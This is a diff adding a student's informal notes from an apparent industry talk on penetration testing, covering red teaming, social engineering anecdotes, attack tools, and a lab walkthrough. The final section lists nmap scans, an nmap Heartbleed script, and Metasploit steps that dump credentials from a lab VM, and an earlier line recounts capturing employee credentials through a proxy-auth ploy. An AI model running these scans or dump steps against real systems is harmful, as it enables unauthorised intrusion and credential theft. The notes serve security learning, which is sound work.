@@ -152,3 +152,80 @@ The above example was used directly from one of a website but I will do my best 
 Deliverable 2
 
 Deliverable 3
+
+
+# Wednesday Industry
+Deloitte
+If both vms are on NAT, they should be able to interact
+
+What is Pentesting?
+Think like criminals
+advide clients on hoe to imporve security
+art & science
+
+what do we do?
+meetings
+talk about what to test
+reporting - findings and solutions
+
+Physical - locks, cctv, elevators
+Human - social engineering, 'forgotten link'
+Cyber - 
+
+Infrastructure - internal network, wifi, windows auth systems
+Web Apps
+Mobile Apps
+Physical and social engineering
+Red teaming
+Citrix/Kiosk breakout
+
+XSS
+Find apache cred folder through text box
+using xss to root
+using expliot-db 
+
+Database weaknesses
+1) Create account
+2) add it to admin group
+
+Demonstrated a social engineering ploy executed on a company. They told them that ip's from Russia and Turkey were attacking them. Proxy auth was used to snatch the employees creds. On their end, they saw ip 1:: and the employee creds in plaintext.
+They also mentioned hacking kiosks through navigating to a sight using a webpage that allows file uploads. Through this, a malicious shell can be injected through an open usb port and crack passwords
+
+Red Teaming
+breaking into a building
+
+Pentesting vs Red eaming
+Specific                Realistic
+Limited Scope           Relevent       
+Narrow focus            Readiness
+
+Tools
+Physical
+Proxmark3 Card Resder
+Low freq antenana
+
+Metasploit
+Powershell empire
+
+power bank
+
+ifconfig - find ip of machine
+-T4 specifies speed
+netdiscover - find alike hosts
+nmaps -sSV -n -T4 -p 4949 192.168.119.135
+make sure to specify protocol and port
+HTTPS
+sslscan <ip:port>
+tls not running properly
+nmap --script=ssl-heartbleed -p 4949 -T4 192.168.119.135
+
+msfdb run - run metasploit
+search heartbleed
+use <path to module>
+        >option
+        >set RHOSTs target ip
+        >run - will scan by defualt
+        set action DUMP
+        >run
+        strings <file>
+        creds dumped
